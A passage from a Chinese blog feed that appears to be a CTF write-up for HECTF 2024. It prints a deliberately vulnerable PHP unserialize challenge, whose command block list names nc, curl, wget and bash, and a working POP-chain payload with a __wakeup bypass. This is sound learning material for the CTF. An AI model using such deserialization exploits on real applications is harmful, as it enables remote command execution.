{
    "version": "https://jsonfeed.org/version/1",
    "title": "golden的部落阁 • All posts by \"ctfer的比赛之路\" category",
    "description": "golden的部落阁",
    "home_page_url": "http://blog.g01den.top",
    "items": [
        {
            "id": "http://blog.g01den.top/posts/de34fe7b.html",
            "url": "http://blog.g01den.top/posts/de34fe7b.html",
            "title": "【2024】HECTF-个人整理向",
            "date_published": "2024-12-09T12:59:36.000Z",
            "content_html": "<p><ul class=\"markdownIt-TOC\">\n<li><a href=\"#wp\">WP：</a>\n<ul>\n<li><a href=\"#web\">Web：</a>\n<ul>\n<li><a href=\"#are-you-happy\">Are you happy?：</a></li>\n<li><a href=\"#baby_unserialize\">baby_unserialize：</a></li>\n<li><a href=\"#baby_sql\">baby_sql：</a>\n<ul>\n<li><a href=\"#%E9%9D%9E%E9%A2%84%E6%9C%9F\">非预期：</a></li>\n<li><a href=\"#%E9%A2%84%E6%9C%9F%E8%A7%A3\">预期解</a></li>\n</ul>\n</li>\n<li><a href=\"#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99\">你一个人专属的进货网站：</a></li>\n<li><a href=\"#ezweb\">ezweb</a></li>\n<li><a href=\"#ezjava\">ezjava：</a></li>\n</ul>\n</li>\n<li><a href=\"#misc\">Misc：</a>\n<ul>\n<li><a href=\"#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85\">简单的压缩包：</a></li>\n</ul>\n</li>\n<li><a href=\"#pwn\">Pwn</a>\n<ul>\n<li><a href=\"#sign-in\">sign in</a></li>\n<li><a href=\"#find-eggy\">find eggy：</a></li>\n<li><a href=\"#arcaea_sorting\">Arcaea_Sorting：</a></li>\n<li><a href=\"#arcaea_sorting_revenge\">Arcaea_Sorting_Revenge：</a></li>\n</ul>\n</li>\n<li><a href=\"#re\">Re：</a>\n<ul>\n<li><a href=\"#babyre\">babyre：</a></li>\n</ul>\n</li>\n<li><a href=\"#crypto\">Crypto：</a>\n<ul>\n<li><a href=\"#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89\">迷茫的艾米莉</a></li>\n<li><a href=\"#seven-more\">seven more</a></li>\n<li><a href=\"#%E7%BF%BB%E4%B8%80%E7%BF%BB\">翻一翻：</a></li>\n<li><a href=\"#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF\">不合格的魔药：</a></li>\n<li><a href=\"#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6\">情书与破碎的证书</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E8%AE%B0%E5%BD%95\">题目描述记录：</a>\n<ul>\n<li><a href=\"#web-2\">Web：</a>\n<ul>\n<li><a href=\"#are-u-happy\"><strong>Are u happy</strong></a></li>\n<li><a href=\"#baby_sql-2\"><strong>baby_sql</strong></a></li>\n<li><a href=\"#baby_unserialize-2\"><strong>baby_unserialize</strong></a></li>\n<li><a href=\"#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-2\"><strong>你一个人专属的进货网站</strong></a></li>\n<li><a href=\"#ezweb-2\"><strong>ezweb</strong></a></li>\n<li><a href=\"#ezjava-2\">ezjava</a></li>\n</ul>\n</li>\n<li><a href=\"#re-2\">Re</a>\n<ul>\n<li><a href=\"#babyre-2\"><strong>babyre</strong></a></li>\n<li><a href=\"#littleasm\"><strong>littleasm</strong></a></li>\n<li><a href=\"#pepy\"><strong>PE?py?</strong></a></li>\n<li><a href=\"#easyree\"><strong>easyree</strong></a></li>\n<li><a href=\"#ezandroid\"><strong>ezAndroid</strong></a></li>\n</ul>\n</li>\n<li><a href=\"#pwn-2\">Pwn</a>\n<ul>\n<li><a href=\"#sign-in-2\"><strong>sign in</strong></a></li>\n<li><a href=\"#find-eggy-2\"><strong>find eggy</strong></a></li>\n<li><a href=\"#arcaea_sorting-2\"><strong>Arcaea_Sorting</strong></a></li>\n<li><a href=\"#arcaea_sorting_revenge-2\"><strong>Arcaea_Sorting_Revenge</strong></a></li>\n<li><a href=\"#%E5%96%B5%E5%96%B5%E5%96%B5\"><strong>喵喵喵</strong></a></li>\n<li><a href=\"#lip\"><strong>lip</strong></a></li>\n</ul>\n</li>\n<li><a href=\"#crypto-2\">Crypto</a>\n<ul>\n<li><a href=\"#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-2\"><strong>迷茫的艾米莉</strong></a></li>\n<li><a href=\"#%E7%BF%BB%E4%B8%80%E7%BF%BB-2\"><strong>翻一翻</strong></a></li>\n<li><a href=\"#seven-more-2\"><strong>seven more</strong></a></li>\n<li><a href=\"#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-2\"><strong>情书与破碎的证书</strong></a></li>\n<li><a href=\"#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-2\"><strong>不合格的魔药</strong></a></li>\n</ul>\n</li>\n<li><a href=\"#misc-2\">Misc</a>\n<ul>\n<li><a href=\"#rem_you\"><strong>Rem_You</strong></a></li>\n<li><a href=\"#funny\"><strong>funny</strong></a></li>\n<li><a href=\"#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-2\"><strong>简单的压缩包</strong></a></li>\n<li><a href=\"#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93\"><strong>恶势力的仓库</strong></a></li>\n<li><a href=\"#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95\"><strong>恶势力的聊天记录</strong></a></li>\n<li><a href=\"#baby_unserialize-3\"><strong>baby_unserialize</strong></a></li>\n<li><a href=\"#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-3\"><strong>你一个人专属的进货网站</strong></a></li>\n<li><a href=\"#ezweb-3\"><strong>ezweb</strong></a></li>\n<li><a href=\"#ezjava-3\">ezjava</a></li>\n</ul>\n</li>\n<li><a href=\"#re-3\">Re</a>\n<ul>\n<li><a href=\"#babyre-3\"><strong>babyre</strong></a></li>\n<li><a href=\"#littleasm-2\"><strong>littleasm</strong></a></li>\n<li><a href=\"#pepy-2\"><strong>PE?py?</strong></a></li>\n<li><a href=\"#easyree-2\"><strong>easyree</strong></a></li>\n<li><a href=\"#ezandroid-2\"><strong>ezAndroid</strong></a></li>\n</ul>\n</li>\n<li><a href=\"#pwn-3\">Pwn</a>\n<ul>\n<li><a href=\"#sign-in-3\"><strong>sign in</strong></a></li>\n<li><a href=\"#find-eggy-3\"><strong>find eggy</strong></a></li>\n<li><a href=\"#arcaea_sorting-3\"><strong>Arcaea_Sorting</strong></a></li>\n<li><a href=\"#arcaea_sorting_revenge-3\"><strong>Arcaea_Sorting_Revenge</strong></a></li>\n<li><a href=\"#%E5%96%B5%E5%96%B5%E5%96%B5-2\"><strong>喵喵喵</strong></a></li>\n<li><a href=\"#lip-2\"><strong>lip</strong></a></li>\n</ul>\n</li>\n<li><a href=\"#crypto-3\">Crypto</a>\n<ul>\n<li><a href=\"#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-3\"><strong>迷茫的艾米莉</strong></a></li>\n<li><a href=\"#%E7%BF%BB%E4%B8%80%E7%BF%BB-3\"><strong>翻一翻</strong></a></li>\n<li><a href=\"#seven-more-3\"><strong>seven more</strong></a></li>\n<li><a href=\"#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-3\"><strong>情书与破碎的证书</strong></a></li>\n<li><a href=\"#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-3\"><strong>不合格的魔药</strong></a></li>\n</ul>\n</li>\n<li><a href=\"#misc-3\">Misc</a>\n<ul>\n<li><a href=\"#rem_you-2\"><strong>Rem_You</strong></a></li>\n<li><a href=\"#funny-2\"><strong>funny</strong></a></li>\n<li><a href=\"#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-3\"><strong>简单的压缩包</strong></a></li>\n<li><a href=\"#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93-2\"><strong>恶势力的仓库</strong></a></li>\n<li><a href=\"#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95-2\"><strong>恶势力的聊天记录</strong></a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n(这里写目录标题)<br>\n 本来想整理下所有的 wp 的，结果最后发现好多都不会，别的不会的抄 wp 的话似乎也就只有抄大佬们交上来的 wp，不大好，所以最后只写了部分 wp，剩下等到学长们把官方 wp 传上去再整理。</p>\n<h1 id=\"wp\"><a class=\"markdownIt-Anchor\" href=\"#wp\">#</a> WP：</h1>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web：</h2>\n<h3 id=\"are-you-happy\"><a class=\"markdownIt-Anchor\" href=\"#are-you-happy\">#</a> Are you happy?：</h3>\n<p>​\t\tgame.js 里找，flag 在里面，根据 flag 的格式，flag 开头是 HECTF，将这个字段 base64 编码下，然后就可以搜索了。</p>\n<h3 id=\"baby_unserialize\"><a class=\"markdownIt-Anchor\" href=\"#baby_unserialize\">#</a> baby_unserialize：</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag in /flag&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$passwd</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span> = <span class=\"string\">&quot;guest&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$passwd</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;passwd = <span class=\"variable\">$passwd</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;token = <span class=\"string\">&quot;guest&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">check</span>())&#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;msg;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;token === <span class=\"string\">&quot;admin&quot;</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">class00</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span>(<span class=\"params\"><span class=\"variable\">$a</span>, <span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$b</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">class01</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$temp</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cls</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;temp = <span class=\"variable language_\">$this</span>-&gt;cls-&gt;<span class=\"title function_ invoke__\">func1</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;temp === <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;cls-&gt;str1 = <span class=\"variable language_\">$this</span>-&gt;str3;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;0&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;0&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;have fun&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">class02</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$payload</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\\$|\\x00|`|env|\\?|wget|\\&quot;|\\&#x27;|\\\\\\|php|id|whoami|=/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;payload)) &#123; </span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$this</span>-&gt;payload.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fuck you Hacker&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user&quot;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user&quot;</span>]));</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">flag in /flag</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先是从有 system 的函数开始看，首先就是需要有能够触发 class02 <code>__involk</code>  的地方，这里就需要找到其他的动态函数调用的点，在 class00 的 <code>__set</code>  处找到了，之后在 class01 的 <code>__tostring</code>  里找到了，也就是 <code>$this-&gt;cls-&gt;str1 = $this-&gt;str3;</code> ，不过，这里需要将 cls 修改成 class00 才行，之后再往上，有个比较， <code>if ($this-&gt;temp === 1)</code>  这里需要想办法让表达式为 True，刚好，class00 里面的 <code>__call</code>  可以返回 1，并且 <code>$this-&gt;temp = $this-&gt;cls-&gt;func1();</code>  调用了 cls 里面不存在的方法；之后往回看，我们的目的是找到 wakeup 或者 destruct 等等魔术方法，所以还得继续找， <code>__tostring</code>  能够触发的点，看到 User 类，里面找到了 <code>echo $this-&gt;msg;</code>  这里的 msg 是可控的，刚好，可以用来输出操作，也就是把类当作字符串操作，之后就是想办法绕过 check 函数即可，绕过 <code>__wakeup</code>  即可打出组合拳：</p>\n<p>​\t\t首先是获得前置 payload，也就是序列化链子：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$passwd</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$passwd</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;passwd = <span class=\"variable\">$passwd</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">class00</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span>(<span class=\"params\"><span class=\"variable\">$a</span>, <span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$b</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">class01</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$temp</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$str3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cls</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">class02</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$payload</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">User</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;123456&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;token = <span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;msg = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">class01</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;msg-&gt;cls = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">class00</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;msg-&gt;str3 = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">class02</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;msg-&gt;str3-&gt;payload = <span class=\"string\">&quot;payload&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后，通过信息搜集，发现了 PHP 版本是 5.4，存在成员个数不同绕过 <code>__wakeup</code>  的方法，可以直接干，将上面的 payload 修改一下，然后 base64 编码即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0=</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t好了，之后就是读取 flag 了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span 